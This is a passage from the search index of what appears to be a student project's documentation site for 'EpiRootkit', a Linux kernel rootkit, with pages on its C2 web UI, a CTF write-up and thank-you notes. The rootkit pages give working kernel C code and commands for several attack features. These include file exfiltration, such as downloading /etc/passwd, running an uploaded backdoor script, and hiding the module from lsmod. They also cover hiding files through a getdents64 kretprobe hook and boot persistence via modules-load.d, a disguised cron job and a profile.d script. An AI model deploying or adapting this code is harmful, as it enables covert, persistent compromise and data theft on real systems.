                content: "File Transfer linkTransfer files between the C2 server and victim system using direct content transmission.\nHow It Works linkUpload Process link C2 reads local file and sends content Rootkit receives filename and content Creates file on victim system using filp_open() Writes content using kernel_write() Download Process link C2 requests file by path Rootkit opens file using filp_open() Reads content using kernel_read() Sends content back to C2 server Upload Feature linkBasic Usage link # Upload file to specific path c2-server$ upload Client-1 ./config.txt /etc/myapp/config.txt # ‚úì File uploaded successfully (1024 bytes) # Upload to current directory (uses basename) c2-server$ upload Client-1 ./script.sh # ‚úì File uploaded successfully (512 bytes) -\u003e ./script.sh Implementation Details link File creation: Uses O_WRONLY | O_CREAT | O_TRUNC flags Permissions: Files created with 0644 permissions Size limits: 10MB maximum file size Download Feature linkBasic Usage link # Download to specific local path c2-server$ download Client-1 /etc/passwd ./victim_passwd # ‚úì File downloaded successfully (2048 bytes) # Download to current directory (uses basename) c2-server$ download Client-1 /etc/hostname # ‚úì File downloaded successfully (64 bytes) -\u003e ./hostname Real Examples linkSystem Files link # Download system configuration c2-server$ download Client-1 /etc/passwd # ‚úì File downloaded successfully (2048 bytes) # Content: root:x:0:0:root:/root:/bin/bash # daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin # ... # Download network configuration c2-server$ download Client-1 /etc/hosts # ‚úì File downloaded successfully (256 bytes) # Content: 127.0.0.1\tlocalhost # 127.0.1.1\tvictim # ... Upload Scripts link # Upload a shell script c2-server$ upload Client-1 ./backdoor.sh /tmp/backdoor.sh # ‚úì File uploaded successfully (1024 bytes) # Make it executable (via exec command) c2-server$ exec Client-1 chmod +x /tmp/backdoor.sh # Exit code: 0 # Run the script c2-server$ exec Client-1 /tmp/backdoor.sh # Exit code: 0 # Output: Backdoor installed successfully Technical Implementation linkUpload Handler link static int handle_upload(const char *data) { char *filename, *file_content, *separator; struct file *file; loff_t pos = 0; ssize_t bytes_written; // Parse filename:content format separator = strchr(data, ':'); *separator = '\\0'; filename = data; file_content = separator + 1; // Validate filename if (!validate_filename(filename)) return send_error(\"Invalid or unsafe filename\"); // Create and write file file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644); bytes_written = kernel_write(file, file_content, content_length, \u0026pos); filp_close(file, NULL); return send_success(\"File uploaded successfully\"); } Download Handler link static int handle_download(const char *data) { struct file *file; loff_t file_size, pos = 0; char *file_content, *result_buffer; ssize_t bytes_read; // Open file file = filp_open(data, O_RDONLY, 0); if (IS_ERR(file)) return send_error(\"File not found or cannot be opened\"); // Check file size file_size = i_size_read(file_inode(file)); if (file_size \u003e MAX_FILE_SIZE) { filp_close(file, NULL); return send_error(\"File too large to download\"); } // Read file content file_content = vmalloc(file_size + 1); bytes_read = kernel_read(file, file_content, file_size, \u0026pos); file_content[bytes_read] = '\\0'; // Format response result_buffer = vmalloc(file_size + 32); snprintf(result_buffer, file_size + 32, \"DOWNLOAD:%s\", file_content); return send_result(result_buffer); } Configuration link // rootkit/core/config.h #define MAX_FILE_SIZE (10 * 1024 * 1024) // 10MB #define MAX_FILENAME_LENGTH 255 "
            }
        );
    index.add(
            {
                id:  17 ,
                href: "\/docs\/04-epirootkit\/features\/hiding\/",
                title: "Stealth \u0026 Hiding",
                description: "Module hiding and file hiding capabilities",
                content: "Stealth \u0026 Hiding linkHide the rootkit module and files from system detection using kernel hooking techniques.\nWhat We Implemented linkModule Hiding link Hide from lsmod: Remove module from kernel module list Hide from /proc/modules: Module not visible in procfs Dynamic control: Toggle visibility via C2 commands File Hiding link Hide by prefix: Files with specific prefixes are hidden Directory listing: Intercept getdents64 syscall Automatic hiding: Enabled by default when module loads Module Hiding linkHow It Works link Find module: Locate rootkit in kernel module list Remove from list: Use list_del() to remove from modules list Store reference: Keep pointer to restore later Toggle visibility: Can hide/unhide dynamically Implementation link int hide_module(void) { struct module *mod; mutex_lock(\u0026module_mutex); list_for_each_entry(mod, \u0026modules, list) { if (mod == THIS_MODULE) { stealth_state.prev_module_entry = mod-\u003elist.prev; list_del(\u0026mod-\u003elist); stealth_state.module_hidden = true; break; } } mutex_unlock(\u0026module_mutex); return 0; } Usage link # Hide the module c2-server$ config Client-1 # Select: Toggle Module Hiding # ‚úì Module hidden # Verify hiding (from victim system) victim$ lsmod | grep epirootkit # (no output - module is hidden) # Check status c2-server$ status Client-1 # Module Hidden: YES Detection Evasion link lsmod command: Module not listed /proc/modules: Entry removed from procfs System monitoring: Most tools rely on these sources File Hiding linkHow It Works link Hook getdents64: Use kretprobe to intercept directory listings Filter entries: Remove files with configured prefixes Modify buffer: Adjust directory entry buffer Return filtered: Send modified listing to userspace Hidden File Prefixes linkFiles starting with these prefixes are automatically hidden:\nstatic const char * const hide_prefixes[] = { \"epirootkit\", \"jules_est_bo_\", \"memfd:\", \".hidden_\", }; Implementation link static int getdents64_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs) { struct getdents_context *ctx = (struct getdents_context *)ri-\u003edata; const long ret_value = regs_return_value(regs); char *kernel_buffer; long filtered_size; // Copy user buffer to kernel space for filtering kernel_buffer = kmalloc(ret_value, GFP_ATOMIC); if (copy_from_user(kernel_buffer, ctx-\u003euser_buffer, ret_value) == 0) { filtered_size = filter_directory_entries(kernel_buffer, ret_value); if (filtered_size != ret_value) { copy_to_user(ctx-\u003euser_buffer, kernel_buffer, filtered_size); regs_set_return_value(regs, filtered_size); } } kfree(kernel_buffer); return 0; } Examples of Hidden Files link # These files are hidden from 'ls' output: /tmp/epirootkit_temp /var/log/epirootkit.log /home/user/epirootkit_config /tmp/jules_est_bo_secret /tmp/.hidden_file /tmp/memfd:something Testing File Hiding link # Create test files c2-server$ exec Client-1 touch /tmp/epirootkit_test c2-server$ exec Client-1 touch /tmp/normal_file # List directory (file hiding active) c2-server$ exec Client-1 ls -la /tmp/ # Only shows: normal_file (epirootkit_test is hidden) # Files still exist and accessible c2-server$ exec Client-1 cat /tmp/epirootkit_test # Works fine - file exists but hidden from listings Dynamic Control linkAvailable Commands link # Hide module c2-server$ hide_module Client-1 # SUCCESS: Module hidden # Unhide module c2-server$ unhide_module Client-1 # SUCCESS: Module visible # Check status c2-server$ status Client-1 # Module Hidden: YES/NO # File Hiding: ENABLED (always on) Interactive Configuration link c2-server$ config Client-1 # ‚îå‚îÄ Configuration - Client-1 # Current Configuration: # [X] Module Hiding (Click to disable) # # ? Select option: [Use arrow keys] # ‚ùØ [X] Module Hiding (Click to disable) # Refresh Status # Exit Technical Details linkSyscall Hooking link Method: kretprobe on getdents64 syscall Kernel version: Compatible with Linux 5.4.0 Memory safety: GFP_ATOMIC allocations with 4KB limit Error handling: Graceful fallback on allocation failures Module List Manipulation link Mutex protection: Uses module_mutex for thread safety List operations: Standard kernel list_del() and list_add() State tracking: Maintains hiding state in global structure Performance Impact link Module hiding: One-time operation (minimal impact) File hiding: Per-directory-listing overhead (~1-2%) Memory usage: Temporary buffers for directory filtering Security Considerations linkDetection Methods link Direct memory scanning: May detect module signatures in memory Syscall hooking detection: Can identify kretprobe modifications Behavioral analysis: Monitor for suspicious kernel behavior Alternative listing methods: Direct /proc/modules access Limitations link File hiding scope: Only affects getdents64 syscall Module hiding scope: Only affects standard module listing Memory footprint: Module still present in kernel memory Advanced detection: Sophisticated tools may still detect Configuration linkEnable/Disable Features link // rootkit/core/config.h #define ENABLE_FILE_HIDING 1 // Currently enabled Customize Hidden Prefixes linkEdit the hide_prefixes array in stealth.c to change which files are hidden.\nTroubleshooting linkModule Still Visible link # Check if hiding was successful c2-server$ status Client-1 # Module Hidden: YES/NO # Try hiding again c2-server$ hide_module Client-1 File Hiding Not Working link # Check if stealth module loaded dmesg | grep -i stealth # File hiding is automatic - no manual control # Only affects files with configured prefixes Performance Issues link # Monitor system performance c2-server$ exec Client-1 top c2-server$ exec Client-1 iostat # File hiding adds minimal overhead # Module hiding is one-time operation Current Status link Module Hiding: ‚úÖ Fully implemented and working File Hiding: ‚úÖ Fully implemented and working Dynamic Control: ‚úÖ Can toggle module hiding via C2 Automatic Activation: ‚úÖ File hiding enabled on module load Comprehensive hiding capabilities using modern kernel hooking techniques while maintaining system stability.\n"
            }
        );
    index.add(
            {
                id:  18 ,
                href: "\/docs\/04-epirootkit\/features\/persistence\/",
                title: "Persistence",
                description: "Multiple boot persistence mechanisms for rootkit survival",
                content: "Persistence linkMultiple boot persistence mechanisms to ensure rootkit survival across system reboots.\nWhat We Implemented linkThree Persistence Mechanisms link modules-load.d: Systemd automatic module loading Cron Jobs: Scheduled module loading via cron Shell Profiles: Load via user login scripts Automatic Installation link On module load: All persistence mechanisms installed automatically Dynamic control: Install/remove via C2 commands Individual control: Manage each mechanism separately How It Works linkAutomatic Installation linkWhen the rootkit loads, it automatically installs all persistence mechanisms:\nint persistence_init(void) { pr_info(\"EpiRootkit: Persistence module initialized\\n\"); // Automatically install all persistence mechanisms return persistence_install(); } Manual Control link # Install all persistence mechanisms c2-server$ persist_install Client-1 # SUCCESS: All persistence mechanisms installed # Remove all persistence mechanisms c2-server$ persist_remove Client-1 # SUCCESS: All persistence mechanisms removed # Individual mechanism control c2-server$ persist_modules Client-1 # modules-load.d only c2-server$ persist_cron Client-1 # cron only c2-server$ persist_profile Client-1 # shell profile only Mechanism 1: modules-load.d linkHow It Works link File: /etc/modules-load.d/epirootkit.conf Content: epirootkit Boot process: systemd reads config and loads module automatically Implementation link int persistence_install_modules_load(void) { char config_path[256]; int ret; snprintf(config_path, sizeof(config_path), \"%s%s\", MODULES_LOAD_DIR, EPIROOTKIT_CONF); ret = write_file(config_path, MODULE_NAME \"\\n\"); if (ret \u003c 0) return ret; pr_info(\"EpiRootkit: modules-load.d persistence installed\\n\"); return 0; } Verification link # Check if installed c2-server$ exec Client-1 cat /etc/modules-load.d/epirootkit.conf # Exit code: 0 # Output: # epirootkit # Remove manually c2-server$ exec Client-1 rm /etc/modules-load.d/epirootkit.conf Mechanism 2: Cron Jobs linkHow It Works link File: /etc/cron.d/system-update (we are stealthy hehe) Schedule: Every minute check and load if not present Command: * * * * * root /sbin/modprobe epirootkit 2\u003e/dev/null Implementation link int persistence_install_cron(void) { char cron_path[256]; char cron_content[512]; int ret; snprintf(cron_path, sizeof(cron_path), \"%s%s\", CRON_DIR, EPIROOTKIT_CRON); snprintf(cron_content, sizeof(cron_content), \"# EpiRootkit persistence cron job\\n\" \"* * * * * root /sbin/modprobe %s 2\u003e/dev/null\\n\", MODULE_NAME); ret = write_file(cron_path, cron_content); if (ret \u003c 0) return ret; pr_info(\"EpiRootkit: Cron persistence installed\\n\"); return 0; } Verification link # Check cron job c2-server$ exec Client-1 cat /etc/cron.d/system-update # Exit code: 0 # Output: # # EpiRootkit persistence cron job # * * * * * root /sbin/modprobe epirootkit 2\u003e/dev/null # Check cron logs c2-server$ exec Client-1 grep epirootkit /var/log/syslog Mechanism 3: Shell Profiles linkHow It Works link File: /etc/profile.d/system-env.sh Trigger: Executes when any user logs in Command: Loads module if not already present Implementation link int persistence_install_shell_profile(void) { char profile_path[256]; char profile_content[512]; int ret; snprintf(profile_path, sizeof(profile_path), \"%s%s\", PROFILE_DIR, EPIROOTKIT_PROFILE); snprintf(profile_content, sizeof(profile_content), \"#!/bin/bash\\n\" \"# EpiRootkit persistence via shell profile\\n\" \"if [ \\\"$(id -u)\\\" -eq 0 ]; then\\n\" \" /sbin/modprobe %s 2\u003e/dev/null\\n\" \"fi\\n\", MODULE_NAME); ret = write_file(profile_path, profile_content); if (ret \u003c 0) return ret; pr_info(\"EpiRootkit: Shell profile persistence installed\\n\"); return 0; } Verification link # Check profile script c2-server$ exec Client-1 cat /etc/profile.d/system-env.sh # Exit code: 0 # Output: # #!/bin/bash # # EpiRootkit persistence via shell profile # if [ \"$(id -u)\" -eq 0 ]; then # /sbin/modprobe epirootkit 2\u003e/dev/null # fi Technical Implementation linkFile Operations link static int write_file(const char *path, const char *content) { struct file *file; loff_t pos = 0; ssize_t bytes_written; size_t content_len = strlen(content); file = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644); if (IS_ERR(file)) return PTR_ERR(file); bytes_written = kernel_write(file, content, content_len, \u0026pos); filp_close(file, NULL); return (bytes_written == content_len) ? 0 : -EIO; } File Removal link static int remove_file(const char *path) { struct path file_path; struct dentry *dentry; struct inode *dir_inode; int ret; ret = kern_path(path, LOOKUP_FOLLOW, \u0026file_path); if (ret) return 0; // File doesn't exist - not an error dentry = file_path.dentry; dir_inode = d_inode(dentry-\u003ed_parent); inode_lock(dir_inode); ret = vfs_unlink(dir_inode, dentry, NULL); inode_unlock(dir_inode); path_put(\u0026file_path); return ret; } Manual Testing link # Test modules-load.d c2-server$ exec Client-1 systemd-modules-load /etc/modules-load.d/system-update.conf # Test cron job manually c2-server$ exec Client-1 /sbin/modprobe epirootkit # Test profile script c2-server$ exec Client-1 bash /etc/profile.d/system-env.sh "
            }
        );
    index.add(
            {
                id:  19 ,
                href: "\/docs\/06-web-ui\/overview\/",
                title: "README",
                description: "A modern, user-friendly frontend for the C2 server.",
                content: " The Web UI is a modern frontend for the EpiRootkit Attacking Program (C2 Server). It provides a graphical, tiling window manager interface for managing clients, sending commands, and monitoring events.\nPhilosophy:\nUsability and productivity for operators Real-time feedback and event visibility Extensible, modular panel system Keyboard-driven workflow (with mouse support) Main Features:\nTiling window manager UI for flexible panel arrangement Real-time event log panel Terminal, Overview, and Upload/Download panels Global keyboard shortcuts for all major actions Drag-and-drop panel reordering This section covers the rationale, features, and usage of the Web UI. See the following pages for details on setup, features, and development notes.\n"
            }
        );
    index.add(
            {
                id:  20 ,
                href: "\/docs\/06-web-ui\/",
                title: "Web UI (C2 Frontend)",
                description: "Modern web interface for the Attacking Program (C2 Server)",
                content: ""
            }
        );
    index.add(
            {
                id:  21 ,
                href: "\/docs\/06-web-ui\/installation\/",
                title: "Installation \u0026 Setup",
                description: "How to install and launch the Web UI.",
                content: "Web UI Installation \u0026 Setup link Assumption: You are starting from a fresh Ubuntu system. Complete "
            }
        );
    index.add(
            {
                id:  22 ,
                href: "\/docs\/06-web-ui\/i3\/",
                title: "i3 like interface",
                description: "I hate myself, so I remade i3-wm in React",
                content: "i3 like interface linkYes, you read that right. I really tried to make this part of the Web UI feel like i3-wm.\nBasically it‚Äôs a tiling window manager that allows you to move panels around with the keyboard.\nWhy ? linkBecause I bloody can, that‚Äôs why.\ninfo I had to use Alt as Modifier, I‚Äôm truly saddened by this but Ubuntu wouldn‚Äôt let me use the Windows key in firefox‚Ä¶ You can use this as like a dashboard widgets where you can move the panels around resize them etc to neatly manage your precious display real estate.\nShortcuts link Shortcut Action Alt + ‚Üê or Alt + H Move panel to the left Alt + ‚Üí or Alt + L Move panel to the right Alt + ‚Üë or Alt + K Move panel up Alt + ‚Üì or Alt + J Move panel down Alt + Q Close current panel Alt + Enter Open and focus on client Terminal Alt + E Open and focus on Event Logs Alt + O Open and focus on Overview Alt + U Open and focus on Upload/Download ‚Üê, ‚Üí, ‚Üë, ‚Üì Focus on previous/next/up/down panel But for real, why ? linkTo be honest, at first I just wanted a nice way to display the panels and move them around like widgets.\nBut then, as I was implementing the idea I had in mind, I realized it was basically slowly making a worse version of i3-wm.\nSo I just went all in because why not ?\n"
            }
        );
    index.add(
            {
                id:  23 ,
                href: "\/docs\/07-bonuses\/wlkom-ctf\/",
                title: "Tux Fan Club: Chasse au Tr√©sor Pirate",
                description: "Cap'tain Ren√© Bojolais est un petit cachotier.",
                content: "Treasure Hunt ü™ô linkD√©couverte d‚Äôun myst√©rieux fichier‚Ä¶ linkNous avons d√©cid√© d‚Äôaccepter une qu√™te secondaire durant le projet Rootkit.\nEn effet, comme tout bon pirate, nous avons t√©l√©charg√© l√©galement les fichiers fournis (given files) et nous souhaitions les ignorer avec un fichier .gitignore.\nLe .gitignore ressemblait √† :\n.gitignore givenfiles/ Sauf que les fichiers n‚Äô√©taient pas ignor√©s. C‚Äôest l√† que nous d√©couvrons un myst√©rieux fichier .README :\nArborescence r√©v√©lant le fichier cach√©\nTentative de lecture du parchemin linkApr√®s avoir acc√©d√© √† ce fichier, nous d√©cidons de l‚Äôouvrir. Le d√©chiffrer √©tait une autre paire de manches‚Ä¶\nContenu du fichier myst√©rieux\nW3lc0m3 t0 thE 53cR3t p1r4t35 l4ir. Young pirate, you have find my treasure. It is yours. Navigate safely, -- Cap'tain Ren√© Bojolais Le reste du parchemin √©tait du langage cod√©. Gr√¢ce √† notre exp√©rience en programmation et en langues, nous comprenons qu‚Äôil s‚Äôagit d‚Äôune image encod√©e en base64.\nD√©chiffrer l‚Äôimage linkAvec la commande base64 -d .README \u003e image.jpg nous avons pu obtenir l‚Äôimage (il fallait √©videmment garder que la partie en base64 du README).\nImage d√©chiffr√©e\nVoici la magnifique illustration‚Ä¶ Mais nous savons que le capitaine Ren√© avait plus d‚Äôun tour dans son sac. Donc nous d√©cidions d‚Äôexaminer l‚Äôimage en d√©tail.\nChanson cach√©e linkEn utilisant le site https://georgeom.net/StegOnline/upload pour extraire les valeurs RGB de l‚Äôimage et le texte cach√©, on remarque une cha√Æne de caract√®res insolite‚Ä¶\nExtraction de donn√©es cach√©es\nI am captain Jack Sparrow - Remix high bass quality - SAVAGE MIX.wavUT\nCela nous rappelle une chanson de pirates bien connue‚Ä¶\nNotre premi√®re id√©e est de chercher le remix sur Youtube afin de voir si le Capitaine Ren√© n‚Äôa pas laiss√© un petit flag en commentaire. Apparemment, il n‚Äôest pas fan d‚ÄôOSINT, dommage üòî\nNotre deuxi√®me id√©e est de d√©zipper l‚Äôimage unzip image.jpg et l√†, bingo !\nArchive: image.jpg warning [image.jpg]: 21054 extra bytes at beginning or within zipfile (attempting to process anyway) inflating: I am captain Jack Sparrow - Remix high bass quality - SAVAGE MIX.wav Audacity time linkGr√¢ce √† notre exp√©rience en CTF, nous avons tout de suite l‚Äôid√©e d‚Äôexaminer le spectrogramme.\nRien d‚Äôanormal sauf sur les derni√®res secondes du fichier. Et l√†‚Ä¶ nous trouvons le flag !\nLe tr√©sor cach√© dans le spectrogramme\nIl ne nous reste qu‚Äô√† transmettre le mot de passe au capitaine et √† nous le tr√©sor‚Ä¶\nTr√©sor link Grrr des canards\nConclusion linkUne fois cette chasse au tr√©sor finie, il est temps de commencer le projet principal üëÄ\n"
            }
        );
    index.add(
            {
                id:  24 ,
                href: "\/docs\/08-remerciements\/thankyou\/",
                title: "Un dernier mot",
                description: "Hugo linkBonjour,\nMerci beaucoup Jules pour ce projet!\nIl m‚Äôa permis d‚Äôexp√©rimenter plein de sujets diff√©rents, j‚Äôai profit√© de l‚Äôexcuse de ‚Äúc‚Äôest pour le travail d‚ÄôEPITA‚Äù pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont √©crits), j‚Äôai pu mettre en pratique directement ce que j‚Äôai pu apprendre dans mon travail, notamment j‚Äôavais d√ª faire une pr√©sentation sur un rootkit (PUMAKIT) √† ma bo√Æte, et j‚Äôai pu m‚Äôen inspirer et recr√©er le rootkit en am√©liorant certaines fonctionnalit√©s (car franchement il √©tait assez mal foutu, les Chinois n‚Äôont qu‚Äô√† bien se tenir). J‚Äôai eu l‚Äôoccasion de discuter avec certains SRS pour avoir des avis sur certaines impl√©mentations. Spoiler, ils √©taient tous jaloux du fait que en premi√®re ann√©e d‚Äôalternance on fait un projet aussi cool alors qu‚Äôils se tapent de l‚ÄôActive Directory depuis 2 mois.\n",
                content: "Hugo linkBonjour,\nMerci beaucoup Jules pour ce projet!\nIl m‚Äôa permis d‚Äôexp√©rimenter plein de sujets diff√©rents, j‚Äôai profit√© de l‚Äôexcuse de ‚Äúc‚Äôest pour le travail d‚ÄôEPITA‚Äù pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont √©crits), j‚Äôai pu mettre en pratique directement ce que j‚Äôai pu apprendre dans mon travail, notamment j‚Äôavais d√ª faire une pr√©sentation sur un rootkit (PUMAKIT) √† ma bo√Æte, et j‚Äôai pu m‚Äôen inspirer et recr√©er le rootkit en am√©liorant certaines fonctionnalit√©s (car franchement il √©tait assez mal foutu, les Chinois n‚Äôont qu‚Äô√† bien se tenir). J‚Äôai eu l‚Äôoccasion de discuter avec certains SRS pour avoir des avis sur certaines impl√©mentations. Spoiler, ils √©taient tous jaloux du fait que en premi√®re ann√©e d‚Äôalternance on fait un projet aussi cool alors qu‚Äôils se tapent de l‚ÄôActive Directory depuis 2 mois.\nJ‚Äôai m√™me eu l‚Äôid√©e de cr√©er un nouveau club de cyber en parlant √† des gens de ma promo aussi tr√®s investis par le projet (Paul, Kyllian, Matteo‚Ä¶).\nMon ma√Ætre d‚Äôalternance (ancien SRS promo 2012), √©tait tr√®s int√©ress√© par le projet lui aussi et m‚Äôa demand√© de faire une pr√©sentation compl√®te de mon impl√©mentation devant toute l‚Äôentreprise une fois que ce sera fini.\nEt bien √©videmment, ce qui est s√ªrement le plus important, j‚Äôai pu avoir un magnifique canard en plastique, que j‚Äôai tortur√© pendant ce PTN DE RUSH DE JS (oui j‚Äôai encore des s√©quelles).\nBref merci :)\nCanard-ment,\n‚Äì\nHugo Sibony\nAPPING Cyber 2027\n‚ÄúJ‚Äô√©cris ce message a 10000m d‚Äôaltitude dans un avion qui tremble plus que moi dans l‚Äôattente de ma note de JS.‚Äù\nL√©a linkBonjour,\nC‚Äôest L√©a\nCoin-Coin-ment,\n‚Äì L√©a Bonet D√©l√©gu√©e APPING Cyb 2027\n‚ÄúAu moins Hugo ne s‚Äôest pas fait arr√™t√© √† la sortie de l‚Äôavion üëÄ‚Äù\n"
            }
        );
    index.add(
            {
                id:  25 ,
                href: "\/docs\/",
                title: "Docs",
                description: "",
                content: ""
            }
        );
    search.addEventListener('input', show_results, true);

    function show_results(){
        const maxResult =  5 ;
        const minlength =  0 ;
        var searchQuery = sanitizeHTML(this.value);
        var results = index.search(searchQuery, {limit: maxResult, enrich: true});

        
        const flatResults = new Map(); 
        for (const result of results.flatMap(r => r.result)) {
        if (flatResults.has(result.doc.href)) continue;
        flatResults.set(result.doc.href, result.doc);
        }

        suggestions.innerHTML = "";
        suggestions.classList.remove('d-none');

        
        if (searchQuery.length < minlength) {
            const minCharMessage = document.createElement('div')
            minCharMessage.innerHTML = `Please type at least <strong>${minlength}</strong> characters`
            minCharMessage.classList.add("suggestion__no-results");
            suggestions.appendChild(minCharMessage);
            return;
        } else {
            
            if (flatResults.size === 0 && searchQuery) {
                const noResultsMessage = document.createElement('div')
                noResultsMessage.innerHTML = "No results for" + ` "<strong>${searchQuery}</strong>"`
                noResultsMessage.classList.add("suggestion__no-results");
                suggestions.appendChild(noResultsMessage);
                return;
            }
        }

        
        for(const [href, doc] of flatResults) {
            const entry = document.createElement('div');
            suggestions.appendChild(entry);

            const a = document.createElement('a');
            a.href = href;
            entry.appendChild(a);

            const title = document.createElement('span');
            title.textContent = doc.title;
            title.classList.add("suggestion__title");
            a.appendChild(title);

            const description = document.createElement('span');
            description.textContent = doc.description;
            description.classList.add("suggestion__description");
            a.appendChild(description);

            suggestions.appendChild(entry);

            if(suggestions.childElementCount == maxResult) break;
        }
    }
    }());
</script></body></html>